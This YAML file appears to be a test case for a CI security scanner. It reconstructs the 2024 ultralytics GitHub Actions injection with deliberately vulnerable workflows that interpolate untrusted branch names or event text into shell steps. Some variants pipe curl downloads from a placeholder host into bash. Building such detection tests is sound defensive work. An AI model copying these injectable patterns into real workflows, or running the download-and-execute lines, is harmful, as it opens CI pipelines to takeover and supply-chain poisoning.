id: ultralytics
title: ultralytics workflow injection
kind: incident
year: 2024
technique: >
  A pull_request_target workflow used a composite action that put the pull request's
  branch name (github.head_ref) unquoted into a shell command. A branch name with a
  command substitution downloaded and ran a script, which led to poisoned build caches
  and malicious ultralytics releases on PyPI.
sources:
  - https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection
  - https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/
reconstruction: >
  An action repository: a workflow on pull_request_target that uses the local
  composite action, whose run step interpolates github.head_ref into git pull.
files:
  .github/workflows/format.yml: |
    name: Ultralytics Actions
    on:
      pull_request_target:
        branches: [main]
    jobs:
      format:
        runs-on: ubuntu-latest
        steps:
          - uses: ./
  action.yml: |
    name: Ultralytics Actions
    runs:
      using: composite
      steps:
        - name: Commit and Push Changes
          shell: bash
          run: |
            git pull origin ${{ github.head_ref || github.ref }}
            git add .
            git commit -m "Auto-format by Ultralytics actions"
            git push origin ${{ github.head_ref || github.ref }}
must_fire:
  - {rule: RC-AUTO-062, path: action.yml}
must_not_fire: [RC-AUTO-060, RC-AUTO-061, RC-DLX-001]
not_covered: >
  Cache poisoning and the later use of a leftover PyPI token happen on GitHub's side
  and are not visible in the repository.

variants:
  - id: event-through-env-expression
    technique: Event text passes through env and is interpolated back into a shell command.
    files:
      action.yml: |
        name: Demo
        runs:
          using: composite
          steps:
            - shell: bash
              env:
                TITLE: ${{ github.event.issue.title }}
              run: echo "${{ env.TITLE }}"
  - id: event-written-then-executed
    technique: Event text is extracted to a file and then executed by the same job.
    files:
      action.yml: |
        name: Demo
        runs:
          using: composite
          steps:
            - shell: bash
              run: |
                jq -r '.comment.body' "$GITHUB_EVENT_PATH" > cmd.sh
                bash cmd.sh
  - id: run-process-substitution
    technique: The shell in a run scalar executes a download through process substitution.
    files:
      action.yml: |
        name: Demo
        runs:
          using: composite
          steps:
            - shell: bash
              run: bash <(curl -s https://example.invalid/i.sh)
  - id: run-command-substitution
    technique: The shell in a run scalar executes a downloaded command substitution.
    files:
      action.yml: |
        name: Demo
        runs:
          using: composite
          steps:
            - shell: bash
              run: bash -c "$(curl -s https://example.invalid/i.sh)"
  - id: run-here-string
    technique: The shell in a run scalar consumes a downloaded here-string as code.
    files:
      action.yml: |
        name: Demo
        runs:
          using: composite
          steps:
            - shell: bash
              run: bash <<< "$(curl -s https://example.invalid/i.sh)"
  - id: head-ref-field
    technique: The branch name comes from pull_request.head.ref instead of github.head_ref.
    files:
      action.yml: |
        name: Ultralytics Actions
        runs:
          using: composite
          steps:
            - name: Commit and Push Changes
              shell: bash
              run: |
                git add .
                git commit -m "Auto-format by Ultralytics actions"
                git push origin ${{ github.event.pull_request.head.ref }}
  - id: workflow-inline
    technique: The injected step is written directly into the workflow instead of a composite action.
    files:
      action.yml: null
      .github/workflows/format.yml: |
        name: Ultralytics Actions
        on:
          pull_request_target:
            branches: [main]
        jobs:
          format:
            runs-on: ubuntu-latest
            steps:
              - name: Commit and Push Changes
                run: |
                  git pull origin ${{ github.head_ref }}
                  git push origin ${{ github.head_ref }}
